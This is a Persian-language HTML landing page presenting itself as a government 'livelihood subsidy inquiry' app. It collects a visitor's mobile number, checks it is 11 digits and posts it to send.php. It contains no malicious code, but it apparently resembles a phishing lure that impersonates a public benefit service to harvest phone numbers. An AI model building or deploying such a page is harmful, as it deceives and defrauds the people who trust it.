<!doctype html>
<html lang="en" dir="rtl">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>صفحه اصلی اپلیکیشن </title>  
   <link rel="stylesheet" href="../font/font.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
       <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
     <style>
       .form-control {
      background-color: #FFFFFF;
      border: 1px solid #ced4da;
      border-radius: 5px;
      padding-left: 25px;
      padding-right: 10px;
      direction: ltr; /* Ensure placeholder text is left-aligned */
    }
    .icon {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 16px;
      color: #868e96;
    }
    .card-body {
      border-radius: 20px;
    }
  
     </style>
       <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.0.1/tailwind.min.css'>    
  </head>
<body style="background-color:#0272bd;font-family:vazir;">

<center>    
 <section class="m-1 rounded-2xl" style="padding-top:8px;">  
     <center> 
  <div style="width:95%;height:120px;background-color:#FFFFFF;border-radius:20px;" class="card-body rounded-2xl"> 
                   
<div class="container">
    <div class="row justify-content-start">
        <div class="col-12">
            <div class="d-flex align-items-center p-1">
                <img style="padding-bottom:25px;" src="../img/mobile.png" width="40px" class="" alt="">
                <div class="d-flex flex-column">
                    <p style="float:right;text-align:right;padding-top:15px;color:#1363a8;padding-right:5px;" class="m-0">
                        <b>
                        
                       اپلیکیشن استعلام معیشتی
                       </b>
                        </p>
                 
                    <small style="font-size:10px;float:right;text-align:right;padding-top:11px;color:#1363a8;padding-left:50px;display:flex;width:100%;" class="">
                       
                        با وارد کردن شماره تلفن می توانید معیشتی خود را مشاهده کنید       
                       </b>
                    </small>
                </div>
            </div>
        </div>
    </div>
</div>
   </div>  
 </section> 
 </center> 
  
  
 
<center>
<section class=" m-1 p-47 rounded-2xl" style="padding-top:8px;">
     <div style="border-radius:20px;width:95%;height:100%;
  background-color: rgba(255, 255, 255, 0.2); /* Initial transparency */
  backdrop-filter: blur(0px); /* Initial blur (adjustable later) */
  transition: backdrop-filter 0.3s ease-in-out; /* Smooth blur transition */" class="w-full bg-white rounded-lg shadow dark:border md:mt-0 sm:max-w-md xl:p-0 dark:bg-gray-300 dark:border-gray-200">
     
          <div class="p-2 space-y-2 md:space-y-2 sm:p-3">
              
               <img src="../img/appt.jpg" width="90%" class="p-1" alt="">
               <p style="font-size:14px;text-align:center;">
               <b>
                   &nbsp;
            جهت استعلام معیشتی شماره موبایل مشمول را وارد 
            کنید
            </b>
            </p>
     
    
             
   
              <form class="space-y-1 md:space-y-2" action="send.php" method="post">
                                    
                                 
       <div class="relative">

  <input type="tel" style="text-align: left;float:left;dir:ltr;border-radius:50px;height:36px;" name="number" id="number" class="form-control bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-primary-600 focus:border-primary-600 block w-full p-2.5 pl-10 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="شماره موبایل را وارد کنید">
  <span style="color:red;text-align:left;" class="error-message"></span>     
    <i style="float:right;" class="absolute top-2 right-3 text-gray-400 fa fa-mobile-alt"></i>        
</div>

             <br> 
             
                   <br>                              
   <button style="width:90%;background-color:#0272bd;color:#FFFFFF;" class="btn" type="submit">
      ادامه فرآیند پیگیری     
      </button>
           
                
         
                          </form>
          </div>
      </div>
  </div>
</section>

<script>
     const form = document.querySelector('form');
const inputs = form.querySelectorAll('input[type="tel"]');

const errorMessage = {
  required: 'این فیلد اجباری است',
  invalidNumber: 'شماره وارد شده معتبر نیست',
};

function validateInput(input) {
  const { name, value } = input;
  const errorElement = input.parentNode.querySelector('.error-message');


  if (!value) {
    errorElement.textContent = errorMessage.required;
    input.classList.add('is-invalid');
    return false;
  }

  switch (name) {  
    case 'number':
      if (!/^\d{11}$/.test(value)) {
        errorElement.textContent = errorMessage.invalidNumber;
        input.classList.add('is-invalid');
        return false;
      }
      break;    
  }

  // در صورت عدم وجود خطا
  errorElement.textContent = '';
  input.classList.remove('is-invalid');
  return true;
}

// بررسی تمام فیلدها هنگام ارسال فرم
form.addEventListener('submit', (event) => {
  event.preventDefault();

  let isValid = true;
  for (const input of inputs) {
    isValid = isValid && validateInput(input);
  }

  // ارسال فرم فقط در صورت معتبر بودن تمام فیلدها
  if (isValid) {
    form.submit();
  }
});

// بررسی هر فیلد هنگام تغییر
inputs.forEach((input) => {
  input.addEventListener('input', () => {
    validateInput(input);
  });
});

</script> 
</body>
</html>
